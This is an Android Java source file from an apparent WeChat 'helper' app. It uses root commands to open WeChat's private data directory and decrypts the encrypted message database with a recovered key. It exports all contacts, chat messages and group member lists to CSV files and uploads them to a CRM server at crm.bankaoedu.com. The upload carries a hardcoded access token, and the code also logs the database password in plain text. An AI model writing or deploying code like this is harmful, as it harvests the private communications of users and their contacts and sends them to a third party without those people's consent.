package com.duke.wechathelper.wechat;

import android.annotation.SuppressLint;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

import com.duke.wechathelper.R;
import com.orhanobut.hawk.Hawk;
import com.tencent.wcdb.Cursor;
import com.tencent.wcdb.database.SQLiteCipherSpec;
import com.tencent.wcdb.database.SQLiteDatabase;
import com.threekilogram.objectbus.bus.ObjectBus;

import org.apache.commons.csv.CSVFormat;
import org.apache.commons.csv.CSVPrinter;
import org.jetbrains.annotations.NotNull;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyTask extends AsyncTask<String, String, String> {
    private File recontactFile;
    private File chatRecordFile;
    private File roomRecordFile;
    @SuppressLint("StaticFieldLeak")
    private ControlActivity controlActivity;

    private long last_up_time = 0;

    //sql 语句
    String contactSql = "select * from rcontact where verifyFlag = 0 and  type != 2 and type != 0 and type != 33 and nickname != ''and nickname != '文件传输助手'";
    String messageSql = "select * from message where  createTime >";
    String chatroomSql = "select * from chatroom";
    String masSendInfoSql = "select * from massendinfo";

    private static final ObjectBus TASK = ObjectBus.newList();

    /**
     * 微信数据库路径
     */
    public final String WX_ROOT_PATH = "/data/data/com.tencent.mm/";
    public final String WX_DB_DIR_PATH = WX_ROOT_PATH + "MicroMsg";
    public final String WX_DB_FILE_NAME = "EnMicroMsg.db";
    public final String COPY_WX_DATA_DB = "wx_data.db";
    /**
     * 拷贝到sd 卡的路径
     */
    public String copyPath = Environment.getExternalStorageDirectory().getPath() + "/";
    public String copyFilePath = copyPath + COPY_WX_DATA_DB;


    public MyTask(ControlActivity activity, long last_up_time) {
        this.controlActivity = activity;
        this.last_up_time = last_up_time;
    }

    public MyTask(@NotNull ControlActivity activity) {
        this.controlActivity = activity;
    }

    @Override
    protected void onPreExecute() {
        //拷贝前先提示正在处理
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(String... strings) {

        String password = Hawk.get("wx_password");
        if (password == null || password.isEmpty()) {
            //获取root权限
            PasswordUtiles.execRootCmd("chmod 777 -R " + WX_ROOT_PATH);
            //获取root权限
            PasswordUtiles.execRootCmd("chmod 777 -R " + copyFilePath);
            password = PasswordUtiles.initDbPassword(controlActivity);
            if (password.equals("")) {
                controlActivity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        getUploadTimeError("密码获取失败");
                    }
                });
                return "";
            } else {
                Hawk.put("wx_password", password);
            }
        }
        String uid = PasswordUtiles.initCurrWxUin(controlActivity);
        try {
            String path = WX_DB_DIR_PATH + "/" + Md5Utils.md5Encode("mm" + uid) + "/" + WX_DB_FILE_NAME;
            Log.e("path", copyFilePath);
            Log.e("path===", path);
            Log.e("path", password);
            //微信原始数据库的地址
            File wxDataDir = new File(path);
            //将微信数据库拷贝出来，因为直接连接微信的db，会导致微信崩溃
            FileUtil.copyFile(wxDataDir.getAbsolutePath(), copyFilePath);
            File file = new File(copyFilePath);
            //将微信数据库导出到sd卡操作sd卡上数据库
            System.out.println(file.length() + "================================");
            openWxDb(file, password);
        } catch (Exception e) {
            Log.e("path", e.getMessage());
            e.printStackTrace();
        }
        return null;
    }

    private void openWxDb(File dbFile, String password) {
        SQLiteCipherSpec cipher = new SQLiteCipherSpec()  // 加密描述对象
                .setPageSize(1024)        // SQLCipher 默认 Page size 为 1024
                .setSQLCipherVersion(1);  // 1,2,3 分别对应 1.x, 2.x, 3.x 创建的 SQLCipher 数据库
        try {
            //打开数据库连接
//            final SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
            System.out.println(dbFile.length() + "================================");
            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(
                    dbFile,     // DB 路径
                    password.getBytes(),  // WCDB 密码参数类型为 byte[]
                    cipher,                 // 上面创建的加密描述对象
                    null,                   // CursorFactory
                    null                    // DatabaseErrorHandler
                    // SQLiteDatabaseHook 参数去掉了，在cipher里指定参数可达到同样目的
            );
            runRecontact(db);
        } catch (Exception e) {
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
            controlActivity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getUploadTimeError("读取数据库信息失败");
                }
            });
        }
    }

    /**
     * 连接复制的微信数据库
     *
     * @param db
     */
    private void runRecontact(final SQLiteDatabase db) {
        TASK.toPool(new Runnable() {
            @Override
            public void run() {
                getRecontactData(db);
            }
        }).toPool(new Runnable() {
            @Override
            public void run() {
                getReMessageData(db);
            }
        }).toPool(new Runnable() {
            @Override
            public void run() {
                getChatRoomData(db);
            }
        }).toMain(new Runnable() {
            @Override
            public void run() {
                if (recontactFile.exists() && chatRecordFile.exists() && recontactFile.exists()) {
                    controlActivity.loadingDialog.setCancelable(true);
                    TextView textView = controlActivity.loadingDialog.findViewById(R.id.text);
                    textView.setText("微信成功导出聊天记录");
                    controlActivity.loadingDialog.findViewById(R.id.loadingView).setVisibility(View.INVISIBLE);
                    controlActivity.loadingDialog.findViewById(R.id.iv_success).setVisibility(View.VISIBLE);
                    controlActivity.loadingDialog.findViewById(R.id.iv_fail).setVisibility(View.INVISIBLE);
                    controlActivity.loadingDialog.findViewById(R.id.iv_success).setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {
                            upLoadFiles(recontactFile, chatRecordFile, roomRecordFile);
                        }
                    });
                }
            }
        }).run();
    }
    //获取群的信息
    private void getChatRoomData(SQLiteDatabase db) {
        Cursor cursor2 = null;
        try {
            //新建文件保存聊天记录
            roomRecordFile = new File(Environment.getExternalStorageDirectory().getPath() + "/"  + "zhΞchatRoomΞfile" + ".csv");
            // 防止出现乱码 utf-8
            BufferedWriter writer2 = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(roomRecordFile), "UTF-8"));
            CSVPrinter messageCsvPrinter = new CSVPrinter(writer2, CSVFormat.DEFAULT.withHeader("chatroomname", "memberlist", "displayname", "roomowner","selfDisplayName"));

            cursor2 = db.rawQuery(chatroomSql, null);

            while (cursor2.moveToNext()) {
                String chatroomname = cursor2.getString(cursor2.getColumnIndex("chatroomname"));
                String memberlist = cursor2.getString(cursor2.getColumnIndex("memberlist"));
                String displayname = cursor2.getString(cursor2.getColumnIndex("displayname"));
                String roomowner = cursor2.getString(cursor2.getColumnIndex("roomowner"));
                String selfDisplayName = cursor2.getString(cursor2.getColumnIndex("selfDisplayName"));
                messageCsvPrinter.printRecord(chatroomname,memberlist, FilterUtil.filterEmoji(displayname),FilterUtil.filterEmoji(roomowner),selfDisplayName);
            }

            messageCsvPrinter.printRecord();
            messageCsvPrinter.flush();

        } catch (Exception e) {
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
            controlActivity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getUploadTimeError("读取数据库信息失败");
                }
            });
        } finally {
            if (cursor2 != null) {
                cursor2.close();
            }

        }
    }

    /**
     * 获取当前用户的微信所有联系人
     */
    private void getRecontactData(SQLiteDatabase db) {
        Cursor cursor1 = null;
        try {
            //新建文件保存联系人信息
            recontactFile = new File(Environment.getExternalStorageDirectory().getPath() + "/" + "zh" + "ΞcontactΞfile" + ".csv");
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(recontactFile), "UTF-8"));
            CSVPrinter contactCsvPrinter = new CSVPrinter(writer, CSVFormat.DEFAULT.withHeader("userName", "nickName", "alias", "conRemark", "type"));
            // 查询所有联系人verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            cursor1 = db.rawQuery(contactSql, null);
            while (cursor1.moveToNext()) {
                //一开始的微信id
                String userName = cursor1.getString(cursor1.getColumnIndex("username"));
                //网名
                String nickName = cursor1.getString(cursor1.getColumnIndex("nickname"));
                //微信id
                String alias = cursor1.getString(cursor1.getColumnIndex("alias"));
                //备注
                String conRemark = cursor1.getString(cursor1.getColumnIndex("conRemark"));
                String type = cursor1.getString(cursor1.getColumnIndex("type"));
                Log.d("contact", "userName=" + userName + "\n nickName=" + nickName + "\n alias=" + alias + "\n conRemark=" + conRemark + "\n type=" + type);
                //将联系人信息写入 csv 文件
                contactCsvPrinter.printRecord(FilterUtil.filterEmoji(userName), FilterUtil.filterEmoji(nickName), FilterUtil.filterEmoji(alias), FilterUtil.filterEmoji(conRemark), type);
            }
            contactCsvPrinter.printRecord();
            contactCsvPrinter.flush();
        } catch (Exception e) {
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
            controlActivity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getUploadTimeError("读取数据库信息失败");
                }
            });
        } finally {
            if (cursor1 != null) {
                cursor1.close();
            }
        }
    }

    /**
     * 获取聊天记录
     *
     * @param db
     */
    public void getReMessageData(SQLiteDatabase db) {
        Cursor cursor3 = null;
        Log.e("query查询分割时间", DateUtil.timeStamp2Date(last_up_time + ""));
        try {
            //新建文件保存聊天记录
            chatRecordFile   = new File(Environment.getExternalStorageDirectory().getPath() + "/" + "zhΞmessageΞfile" + ".csv");
            // 防止出现乱码 utf-8
            BufferedWriter writer2 = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(chatRecordFile), "UTF-8"));
            CSVPrinter  messageCsvPrinter = new CSVPrinter(writer2, CSVFormat.DEFAULT.withHeader("talker", "content", "createTime", "imgPath", "isSend", "type"));

            //判断是否强制更新所有的记录
            if (last_up_time == 0) {
                //如果是选择全部,则sql 为0
                    cursor3 = db.rawQuery(messageSql + 0, null);
                    Log.e("query", "更新状态:更新全部记录" + messageSql + 0);
            } else {
                cursor3 = db.rawQuery(messageSql + last_up_time, null);
                Log.e("query", "更新状态:增量更新部分记录" + messageSql + last_up_time);
            }
            while (cursor3.moveToNext()) {
                String content = cursor3.getString(cursor3.getColumnIndex("content"));
                String talker = cursor3.getString(cursor3.getColumnIndex("talker"));
                String createTime = cursor3.getString(cursor3.getColumnIndex("createTime"));
                int isSend = cursor3.getInt(cursor3.getColumnIndex("isSend"));
                int imgPath = cursor3.getInt(cursor3.getColumnIndex("imgPath"));
                int type = cursor3.getInt(cursor3.getColumnIndex("type"));
                if (content != null) {
                    Log.d("chatInfo", "talker=" + talker + "\n createTime=" + DateUtil.timeStamp2Date(createTime.toString()) + "\n content=" + content + "\n imgPath=" + imgPath + "\n isSend=" + isSend + "\n type=" + type);
                    //将聊天记录写入 csv 文件
                    String messageType;
                    switch (type) {
                        case 1:
                            messageType = "文字消息";
                            break;
                        case 47:
                            messageType = "表情消息";
                            break;
                        case 43:
                            messageType = "视频消息";
                            break;
                        case 49:
                            messageType = "链接/小程序/聊天记录";
                            break;
                        case 50:
                            messageType = "语音视频通话";
                            break;
                        case 3:
                            messageType = "图片消息";
                            break;
                        case 34:
                            messageType = "语音消息";
                            break;
                        case 48:
                            messageType = "地图消息";
                            break;
                        case 10000:
                            messageType = "撤回提醒";
                            break;
                        default:
                            messageType = "其他消息";
                            break;
                    }
                    messageCsvPrinter.printRecord(talker, FilterUtil.filterEmoji(content), DateUtil.timeStamp2Date(createTime.toString()), imgPath, isSend, messageType);
                }
            }

        } catch (Exception e) {
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
            controlActivity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getUploadTimeError("读取数据库信息失败");
                }
            });
        } finally {
            if (cursor3 != null) {
                cursor3.close();
            }
        }
    }

    private void getUploadTimeError(String errormessage) {
        controlActivity.loadingDialog.setCancelable(true);
        TextView textView = controlActivity.loadingDialog.findViewById(R.id.text);
        textView.setText(errormessage);
        controlActivity.loadingDialog.findViewById(R.id.loadingView).setVisibility(View.INVISIBLE);
        controlActivity.loadingDialog.findViewById(R.id.iv_success).setVisibility(View.INVISIBLE);
        controlActivity.loadingDialog.findViewById(R.id.iv_fail).setVisibility(View.VISIBLE);
    }

    @Override
    protected void onPostExecute(String s) {
        super.onPostExecute(s);
    }

    //创建接口，成功时候回调
    private OnSuccessListener onSuccessListener;

    public interface OnSuccessListener {
        void onChatSuccess(ArrayList<String> stringArrayList);
    }

    public void setOnSuccessListener(OnSuccessListener onSuccessListener) {
        this.onSuccessListener = onSuccessListener;
    }


    private void upLoadFiles(File recontactFile, File chatRecordFile, File roomRecordFile) {

        OkHttpClient client = new OkHttpClient.Builder()
                .readTimeout(60, TimeUnit.MINUTES)
                .build();
        MultipartBody.Builder builder = new MultipartBody.Builder();

            String TYPE = "application/octet-stream";
            RequestBody recontactFileBody = RequestBody.create(MediaType.parse(TYPE), recontactFile);
            RequestBody chatRecordFileBody = RequestBody.create(MediaType.parse(TYPE), chatRecordFile);
            RequestBody roomRecordFileBody = RequestBody.create(MediaType.parse(TYPE), roomRecordFile);
            RequestBody requestBody = builder
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file[recontactFile]", recontactFile.getName(), recontactFileBody)
                    .addFormDataPart("file[chatRecordFile]", chatRecordFile.getName(), chatRecordFileBody)
                    .addFormDataPart("file[roomRecordFile]", roomRecordFile.getName(), roomRecordFileBody)
                    .addFormDataPart("token", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvY3JtLmJhbmthb2VkdS5jb21cL2FwaVwvbG9naW4iLCJpYXQiOjE2MDYyMDI5NDMsImV4cCI6MTYwNjgwNzc0MywibmJmIjoxNjA2MjAyOTQzLCJqdGkiOiJYVVlyRVg1S0FiaWJFMUdTIiwic3ViIjo0MDgsInBydiI6ImI2ZjdmNDdhY2JmMWE1ZWUxMWIyYjAyOGRjNTZhYTM1ZjIwYzFhN2UifQ.k2Vu9u4pfEcWKcJtqlQRLhXSbDIVg_M5-SVzM15B-xA")
                    .addFormDataPart("c_id", "31")
                    .build();

            Request request = new Request.Builder()
                    .url("https://crm.bankaoedu.com/api/chat_update")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new Callback() {

                private String description;

                @Override
                public void onFailure(Call call, final IOException e) {
                    Log.e("query上传文件失败的返回错误", e.toString());
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    String string = response.body().string();
                    Log.e("query上传文件的返回值", string);
                }
            });
    }
}